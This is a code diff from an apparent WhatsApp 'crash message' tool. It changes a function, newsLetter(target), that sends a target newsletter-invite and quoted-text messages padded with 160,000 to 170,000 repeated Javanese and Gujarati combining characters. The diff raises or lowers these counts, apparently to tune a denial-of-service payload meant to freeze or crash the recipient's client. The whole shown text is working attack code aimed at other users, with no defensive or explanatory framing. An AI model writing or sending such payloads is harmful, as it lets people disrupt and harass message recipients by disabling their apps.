@@ -1884,9 +1884,9 @@ async function newsLetter(target) {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(200000),
+                                newsletterName: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી" + "ી".repeat(160000),
                                 jpegThumbnail: "",
-                                caption: "ꦽ".repeat(200000),
+                                caption: "ꦽ".repeat(160000),
                                 inviteExpiration: Date.now() + 1814400000,
                             },
                         },
@@ -2000,12 +2000,12 @@ async function newsLetter(target) {
         target,
         {
           extendedTextMessage: {
-            text: "ꦾ".repeat(55000),
+            text: "ꦾ".repeat(170000),
             contextInfo: {
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
+                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(170000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
